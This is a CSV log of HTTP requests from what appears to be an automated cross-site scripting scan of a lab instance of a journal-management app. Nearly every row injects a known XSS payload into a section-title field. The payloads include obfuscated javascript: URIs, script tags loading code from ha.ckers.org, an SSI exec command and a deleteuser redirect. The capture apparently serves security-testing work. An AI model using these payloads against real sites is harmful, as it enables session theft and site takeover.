request_id,timestamp,method,uri,query_string,query_params_json,host,user_agent,content_type,accept,referer,cookie_hash,authorization_type,x_forwarded_for,body_truncated,body_len_original,source_ip,source_port,server_ip,server_port,proto,pcap_file,tcp_flags,tcp_flags_str,response_status,response_headers_json,response_size,response_time_ms,response_body_truncated,response_body_len_original,headers_raw
398c4f2447d8de5f5bc351efc53531b9,"Wed, 10 Jun 2026 09:29:51 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3b%2fC%26gt%3b%26lt%3b%2fX%26gt%3b%26lt%3b%2fxml%26gt%3b%26lt%3bSPAN%20DATASRC%3d%23I%20DATAFLD%3dC%20DATAFORMATAS%3dHTML%26gt%3b%26lt%3b%2fSPAN%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,373,172.19.3.26,59608,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
96f7de653e1a11a53953c73288464e0c,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bSPAN%20DATASRC%3d%5c%22%23xss%5c%22%20DATAFLD%3d%5c%22B%5c%22%20DATAFORMATAS%3d%5c%22HTML%5c%22%26gt%3b%26lt%3b%2fSPAN%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,349,172.19.3.26,59630,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
dacb023e51c64a906c4f5c041fd519a0,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bXML%20ID%3d%5c%22xss%5c%22%26gt%3b%26lt%3bI%26gt%3b%26lt%3bB%26gt%3b%26lt%3bIMG%20SRC%3d%5c%22javas%26lt%3b!--%20--%26gt%3bcript%26%2358%3balert('XSS')%5c%22%26gt%3b%26lt%3b%2fB%26gt%3b%26lt%3b%2fI%26gt%3b%26lt%3b%2fXML%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,450,172.19.3.26,59634,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
cfbb321207eb3acdc7a00e6a06c01e31,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bXML%20SRC%3d%5c%22xsstest%26%2346%3bxml%5c%22%20ID%3dI%26gt%3b%26lt%3b%2fXML%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,307,172.19.3.26,59666,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
618dbd3e80b4e9ed116cf0dec9bb7e63,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bSPAN%20DATASRC%3d%23I%20DATAFLD%3dC%20DATAFORMATAS%3dHTML%26gt%3b%26lt%3b%2fSPAN%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,311,172.19.3.26,59646,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
80123ef1edbe2459654b3a23e9e59a9e,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bHTML%26gt%3b%26lt%3bBODY%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,255,172.19.3.26,59672,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
deb4f99a2ffdbe317e1060db4d67c809,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3b%3fxml%26%2358%3bnamespace%20prefix%3d%5c%22t%5c%22%20ns%3d%5c%22urn%26%2358%3bschemas-microsoft-com%26%2358%3btime%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,352,172.19.3.26,59682,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
fa4cacbd1901cc750794da531e670788,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3b%3fimport%20namespace%3d%5c%22t%5c%22%20implementation%3d%5c%22%23default%23time2%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,318,172.19.3.26,59678,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
61386b82ff78408180259521df90d481,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bt%26%2358%3bset%20attributeName%3d%5c%22innerHTML%5c%22%20to%3d%5c%22XSS%26lt%3bSCRIPT%20DEFER%26gt%3balert(%26quot%3bXSS%26quot%3b)%26lt%3b%2fSCRIPT%26gt%3b%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,394,172.19.3.26,59654,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
255e7e90ed46c65a32e713f6d0e6094e,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3b%2fBODY%26gt%3b%26lt%3b%2fHTML%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,261,172.19.3.26,59616,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
e0b029e3368a238c698c6f71e0360bb1,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bSCRIPT%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjpg%5c%22%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,356,172.19.3.26,59608,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
eca6972ef024c013cc0e550cd5f6a448,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3b!--%23exec%20cmd%3d%5c%22%2fbin%2fecho%20'%26lt%3bSCR'%5c%22--%26gt%3b%26lt%3b!--%23exec%20cmd%3d%5c%22%2fbin%2fecho%20'IPT%20SRC%3dhttp%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjs%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b'%5c%22--%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,477,172.19.3.26,59634,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
7aac4e7dfc8b2bd73c4906bd99f7985a,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3b%3f%20echo('%26lt%3bSCR)'%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,251,172.19.3.26,59630,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
af3689259acd2860e11c2923abced023,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=echo('IPT%26gt%3balert(%5c%22XSS%5c%22)%26lt%3b%2fSCRIPT%26gt%3b')%3b%20%3f%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,298,172.19.3.26,59646,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
e869c9fb308897751646bf6debf369a4,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bIMG%20SRC%3d%5c%22http%26%2358%3b%2f%2fwww%26%2346%3bthesiteyouareon%26%2346%3bcom%2fsomecommand%26%2346%3bphp%3fsomevariables%3dmaliciouscode%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,379,172.19.3.26,59666,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
852b2cad49b63d927d244f353c5259c1,"Wed, 10 Jun 2026 09:29:52 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=Redirect%20302%20%2fa%26%2346%3bjpg%20http%26%2358%3b%2f%2fvictimsite%26%2346%3bcom%2fadmin%26%2346%3basp%26deleteuser&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,333,172.19.3.26,59672,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
